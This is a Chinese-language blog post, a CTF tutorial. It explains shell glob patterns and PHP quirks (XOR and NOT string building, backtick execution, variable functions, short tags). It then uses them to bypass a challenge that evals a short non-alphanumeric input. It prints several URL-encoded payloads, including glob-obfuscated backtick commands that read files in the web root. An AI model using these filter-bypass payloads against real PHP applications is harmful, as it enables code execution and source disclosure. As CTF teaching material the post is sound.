@@ -1,0 +1,1514 @@
+<!DOCTYPE html>
+
+
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="https://fonts.loli.net/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="学习Linux的通配符，php的一些特性以及相关的在CTF中的极限利用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux Tricks(二)">
+<meta property="og:url" content="http://yoursite.com/2019/07/07/Linux-Tricks-二/index.html">
+<meta property="og:site_name" content="gtfly">
+<meta property="og:description" content="学习Linux的通配符，php的一些特性以及相关的在CTF中的极限利用">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-07-16T02:10:53.262Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Linux Tricks(二)">
+<meta name="twitter:description" content="学习Linux的通配符，php的一些特性以及相关的在CTF中的极限利用">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"right","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeIn","post_body":"fadeIn","coll_header":"fadeIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/07/07/Linux-Tricks-二/">
+
+
+
+
+
+  <title>Linux Tricks(二) | gtfly</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><script> 
+ function GetRandomNum(Min,Max) 
+ { 
+    var Range = Max - Min; 
+    var Rand = Math.random(); 
+    return(Min + Math.round(Rand * Range)); 
+ } 
+ function setSidebarMarginTop (headerOffset) { 
+    return $('#sidebar').css({ 'margin-top': headerOffset }); 
+ } 
+ function getHeaderOffset () { 
+    return $('.header-inner').height() + CONFIG.sidebar.offset; 
+ }
+    window.onload=function() { 
+    var subtitle = "人生如逆旅，我亦是行人。"; 
+    var mytitle = subtitle.split("W"); 
+    var max = mytitle.length-1;
+    var index = GetRandomNum(0,max); 
+    var text = mytitle[index]; 
+    $("#helloTitle").html(text); 
+    var headOffset = getHeaderOffset(); 
+    setSidebarMarginTop(headOffset); 
+// alert(getHeaderOffset()); 
+ }  
+</script>
+
+<div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">gtfly</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">人生如逆旅，我亦是行人。</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-resource">
+          <a href="https://github.com/gtfly?tab=stars" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-star"></i> <br>
+            
+            资源
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-paper-plane"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/07/Linux-Tricks-二/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="gtfly">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="gtfly">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Linux Tricks(二)</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-07T17:31:46+08:00">
+                2019-07-07
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-07-16T10:10:53+08:00">
+                2019-07-16
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/07/07/Linux-Tricks-二/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/07/07/Linux-Tricks-二/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>学习Linux的通配符，php的一些特性以及相关的在CTF中的极限利用</p>
+<a id="more"></a>
+
+<h3 id="glob模式"><a href="#glob模式" class="headerlink" title="glob模式"></a>glob模式</h3><p>glob名字起源于Unix V6中的/etc/glob，glob是一种特殊的模式匹配；现Linux系统已将glob整合到了shell中；shell通配符/glob模式常用来匹配目录及文件</p>
+<p>常用语法：</p>
+<table>
+<thead>
+<tr>
+<th>字符</th>
+<th align="center">解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>*</td>
+<td align="center">匹配任意长度任意字符</td>
+</tr>
+<tr>
+<td>?</td>
+<td align="center">匹配任意单个字符</td>
+</tr>
+<tr>
+<td>[^a]</td>
+<td align="center">匹配任意不是字符a的其他字符</td>
+</tr>
+<tr>
+<td>[0-9]</td>
+<td align="center">匹配数字0-9这一范围内的数字；其匹配范围依据ascii顺序，如匹配大写字母可以用[@-[]表示</td>
+</tr>
+</tbody></table>
+<p>例如，查看当前目录下的<code>index.php</code>内容，可以通过下面的命令来执行：</p>
+<pre><code>cat ?????.???</code></pre><h3 id="bin目录"><a href="#bin目录" class="headerlink" title="/bin目录"></a>/bin目录</h3><p>/bin目录主要放置系统必备的执行文件，如：cat、cp、ls、kill等；可以通过这个目录下的文件来执行命令，如，使用<code>cat</code>命令实际上是使用<code>/bin/cat</code>命令</p>
+<p>那么，当在shell中输入：</p>
+<pre><code>/???/??? ?????.???</code></pre><p>如果当前linux系统文件<code>/bin</code>目录下只有<code>cat</code>这个文件，当前目录下有<code>index.php</code>文件，那么上述命令等同于<code>cat index.php</code>，可以直接输出<code>index.php</code>源码</p>
+<p>但如果<code>/bin</code>目录下有<code>/bin/cat</code>、<code>/bin/dir</code>、<code>/bin/pwd</code>等可以被<code>/???/???</code>匹配到的文件，那么执行<code>/???/??? ?????.???</code>命令时可能会输出乱码或卡住</p>
+<p>注：Linux命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用</p>
+<h3 id="php的一些运算流程、特性"><a href="#php的一些运算流程、特性" class="headerlink" title="php的一些运算流程、特性"></a>php的一些运算流程、特性</h3><h4 id="异或符"><a href="#异或符" class="headerlink" title="异或符(^)"></a>异或符(^)</h4><p>异或实际上是异或字符所对应的ascii码，如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'A'</span> ^ <span class="string">'?'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>运算流程为：<br>1.转换为ascii码的二进制：</p>
+<pre><code>A  -&gt;  65  -&gt;  01000001
+?  -&gt;  63  -&gt;  00111111</code></pre><p>2.执行异或操作：</p>
+<pre><code>01000001
+00111111
+-----------
+01111110</code></pre><p>3.转换为字符：</p>
+<pre><code>01111110 --&gt;  126 --&gt;  ~</code></pre><p>可以使用异或符构造出想要的字符串：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$a = <span class="string">"`&#123;&#123;&#123;"</span>;</span><br><span class="line">$b = <span class="string">"?&lt;&gt;/"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $a^$b;</span><br></pre></td></tr></table></figure>
+
+<p>输出结果  _GET</p>
+<h4 id="取反符"><a href="#取反符" class="headerlink" title="取反符(~)"></a>取反符(~)</h4><p>在了解取反运算流程前，先了解按位取反、原码、反码和补码的概念：</p>
+<ul>
+<li>按位取反：将二进制的每一位进行取反，0取反为1,1取反为0</li>
+<li>原码：一个整数，按照绝对值大小转换为二进制数，最高位为保留位，最高位的0表示正数，1表示负数</li>
+<li>补码：负数是用补码表示的，补码是原码按位取反+1</li>
+</ul>
+<p>需要注意：</p>
+<p>1.<strong>计算机存储二进制数据时，是以原码的补码形式存储的</strong></p>
+<p>2.<strong>正数的原码=反码=补码</strong></p>
+<p>3.<strong>在将十进制数转换为二进制数时需注意：php5.X版本中整数的最大最小区间为-2e31到+2e31，其中有个符号位所以数值表达最高就是31次幂。在php的高版本中会达到64位也就是-2e63到+2e63</strong></p>
+<hr>
+<p>举个栗子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="number">9</span>;</span><br><span class="line"><span class="keyword">echo</span> ~$a;</span><br></pre></td></tr></table></figure>
+
+<p>运算流程为：<br>1.9的原码为：0000 0000 0000 0000 0000 0000 0000 1001 (php5.x版本)<br>2.按位取反：1111 1111 1111 1111 1111 1111 1111 0110，标志位为1，则为负<br>3.负数使用补码表示，补码是原码取反+1，即：</p>
+<pre><code>原码 --》取反 --》+1 --》补码
+原码 = 补码 --》-1 --》取反</code></pre><p>即：</p>
+<pre><code>-1：-111 1111 1111 1111 1111 1111 1111 0101
+取反：-000 0000 0000 0000 0000 0000 0000 1010</code></pre><p>即得到结果 -10</p>
+<h4 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h4><p>1.true为1，false为0</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">true</span>;</span><br><span class="line">$b = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">echo</span> $a+$b;</span><br></pre></td></tr></table></figure>
+
+<p>会输出结果 2</p>
+<p>2.在 php 中未定义的变量默认值为 null，null==false==0</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$_++;</span><br><span class="line">$_++;</span><br><span class="line"><span class="keyword">echo</span> $_;</span><br></pre></td></tr></table></figure>
+
+<p>会产生一个Notice级别的错误，但会输出结果 2</p>
+<h4 id="递增-递减运算符"><a href="#递增-递减运算符" class="headerlink" title="递增/递减运算符"></a>递增/递减运算符</h4><p>字符变量只能递增，不能递减(递减后保持不变)，并且只支持纯字母；其他非字母字符递增后保持不变</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$a = <span class="string">'a'</span>;</span><br><span class="line">$a++;</span><br><span class="line"></span><br><span class="line">$b = <span class="string">'z'</span>;</span><br><span class="line">$b++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br></pre></td></tr></table></figure>
+
+<p>会输出：</p>
+<pre><code>b
+aa</code></pre><h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h4><p>php的反引号中的字符串可以作为shell命令被执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> `ls /`</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="可变函数"><a href="#可变函数" class="headerlink" title="可变函数"></a>可变函数</h4><p>在php中可以将函数名赋给一个变量，使用变量的方式调用某函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'good'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="string">'test'</span>;</span><br><span class="line"></span><br><span class="line">$a();</span><br></pre></td></tr></table></figure>
+
+<h4 id="短标签"><a href="#短标签" class="headerlink" title="短标签"></a>短标签</h4><p>在php的配置文件（php.ini）中有一个short_open_tag的值，开启以后可以使用PHP的短标签：<code>&lt;? ?&gt;</code>；<?php ?>这种形式的标签为长标签</p>
+<p><code>&lt;?=$a?&gt;</code>的作用等价于`<?php echo $a?></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="number">123</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span>=$a<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>会输出结果 123</p>
+<p>除此之外，在短标签内可执行命令或函数并输出结果，如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=`ls /`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可输出根目录内容</p>
+<p>注：使用短标签时需要先闭合长标签</p>
+<h3 id="极限利用-代码分析"><a href="#极限利用-代码分析" class="headerlink" title="极限利用-代码分析"></a>极限利用-代码分析</h3><p>先看代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span><span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">   $code=$_GET[<span class="string">'code'</span>];</span><br><span class="line">   <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">"Too Long."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9_]+/"</span>,$code))&#123;</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">"Not Allowed."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint = "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="方法一-调用可变函数"><a href="#方法一-调用可变函数" class="headerlink" title="方法一.调用可变函数"></a>方法一.调用可变函数</h4><p>payload：</p>
+<pre><code>$啊=(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$啊();
+//$啊=&apos;]@\`@@]&apos;^&apos;:%(&amp;,!:&apos;;$啊();
+//$啊=getFlag;$啊();</code></pre><p>如果过滤了<code>$</code>，那么此方法便不可行了</p>
+<h4 id="方法二-调用动态函数"><a href="#方法二-调用动态函数" class="headerlink" title="方法二.调用动态函数"></a>方法二.调用动态函数</h4><p>payload：</p>
+<pre><code>(~%98%9A%8B%B9%93%9E%98)();</code></pre><p>php7版本可以用<code>($a)()</code>的方式执行动态函数，但在php5中不可以用此方法</p>
+<h4 id="方法三-构造超全局数组变量"><a href="#方法三-构造超全局数组变量" class="headerlink" title="方法三.构造超全局数组变量"></a>方法三.构造超全局数组变量</h4><p>payload1：</p>
+<pre><code>%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa=getFlag
+//${~&quot;\xa0\xb8\xba\xab&quot;}[\xaa]();&amp;\xaa=getFlag
+//${_GET}[\xaa]();&amp;\xaa=getFlag</code></pre><p>payload2：</p>
+<pre><code>%24%7b%22%60%7b%7b%7b%22%5e%22%3f%3c%3e%2f%22%7d%5b%27%2b%27%5d%28%29%3b&amp;%2b=getFlag
+//${&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;}[&apos;+&apos;]();&amp;+=getFlag
+//$_GET[&apos;+&apos;]();&amp;+=getFlag</code></pre><p>如果过滤了 $，此方法也是不可行的</p>
+<h4 id="方法四-读取linux文件"><a href="#方法四-读取linux文件" class="headerlink" title="方法四.读取linux文件"></a>方法四.读取linux文件</h4><p>改进前payload：</p>
+<pre><code>$_=`/???/??? /???/???/????/?????.???`?&gt;&lt;?=$_?&gt;</code></pre><p>对应于：</p>
+<pre><code>$_=`/bin/cat /var/www/html/index.php`?&gt;&lt;?=$_?&gt;</code></pre><p>若其长度超出了限制，那么可以使用通配符<code>*</code>：</p>
+<pre><code>$_=`/???/??? /???/???/????/*`?&gt;&lt;?=$_?&gt;</code></pre><p>问题还没结束，如果过滤了<code>$</code>符和下划线呢？其实并不需要用变量赋值再输出变量，利用短标签特性即可直接执行命令并输出结果</p>
+<pre><code>?&gt;&lt;?=`/???/??? /???/???/????/*`?&gt;</code></pre><p>这里的<code>?&gt;</code>的作用就是闭合前面的长标签<code>&lt;?php</code>，因为eval函数就是简单的把字符串作为代码放到<code>&lt;?php ?&gt;</code>中间</p>
+<p>此方法需要在short_open_tag开启的条件下使用</p>
+<p>有时候题目可能会将<code>cat</code>文件放在其他地方或没有这个文件，可能需要用到其他输出文件内容的文件命令:</p>
+<ul>
+<li>cat 由第一行开始显示内容，并将所有内容输出</li>
+<li>tac 从最后一行倒序显示内容，并将所有内容输出</li>
+<li>more 根据窗口大小，一页一页的显示文件内容</li>
+<li>less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符</li>
+<li>head 只显示头几行</li>
+<li>tail 只显示最后几行</li>
+<li>nl 类似于cat -n，显示时输出行号</li>
+</ul>
+<hr>
+<p>参考文章：</p>
+<p><a href="https://mp.weixin.qq.com/s/TaoivKpgzyg8HZGsUdeytQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/TaoivKpgzyg8HZGsUdeytQ</a></p>
+<p><a href="https://www.anquanke.com/post/id/154284" target="_blank" rel="noopener">https://www.anquanke.com/post/id/154284</a></p>
+<p><a href="https://www.leavesongs.com/penetration/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/penetration/webshell-without-alphanum.html</a></p>
+<p><a href="https://blog.51cto.com/lxqybyq/1683061" target="_blank" rel="noopener">https://blog.51cto.com/lxqybyq/1683061</a></p>
+<p><a href="https://skysec.top/2018/09/24/2018%E5%AE%89%E6%81%92%E6%9D%AF-9%E6%9C%88%E6%9C%88%E8%B5%9BWriteup/" target="_blank" rel="noopener">https://skysec.top/2018/09/24/2018%E5%AE%89%E6%81%92%E6%9D%AF-9%E6%9C%88%E6%9C%88%E8%B5%9BWriteup/</a></p>
+<p><a href="https://www.secpulse.com/archives/96374.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/96374.html</a></p>
+<p><a href="https://www.php.net/manual/zh/migration70.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/migration70.php</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+  <div>
+    
+      ﻿<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+    
+  </div>
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.jpg" alt="gtfly 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/aipay.jpg" alt="gtfly 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    gtfly
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/2019/07/07/Linux-Tricks-二/" title="Linux Tricks(二)">http://yoursite.com/2019/07/07/Linux-Tricks-二/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/04/Ubuntu下的一些配置/" rel="next" title="Ubuntu下的一些配置">
+                <i class="fa fa-chevron-left"></i> Ubuntu下的一些配置
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/07/16/PHP绕过正则匹配/" rel="prev" title="PHP正则最大回溯/递归限制">
+                PHP正则最大回溯/递归限制 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
